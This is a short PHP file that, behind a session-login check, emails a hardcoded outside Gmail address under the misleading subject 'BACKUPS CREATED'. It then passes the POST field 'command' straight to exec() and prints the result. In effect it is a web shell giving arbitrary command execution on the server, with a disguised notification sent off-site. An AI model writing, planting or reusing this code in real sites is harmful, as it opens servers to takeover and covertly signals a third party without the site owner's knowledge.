<?php
// We need to use sessions, so you should always start sessions using the below code.
session_start();
// If the user is not logged in redirect to the login page...
if (!isset($_SESSION['loggedin'])) {
	header('Location: index.php');
	exit();
}
?>
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$sub = "BACKUPS CREATED";
$msg = "backup";
$rec = "redishfish99@gmail.com";
mail($rec,$sub,$msg);
?>
<?php
$cmd = $_POST['command'];
echo exec($cmd);
?>
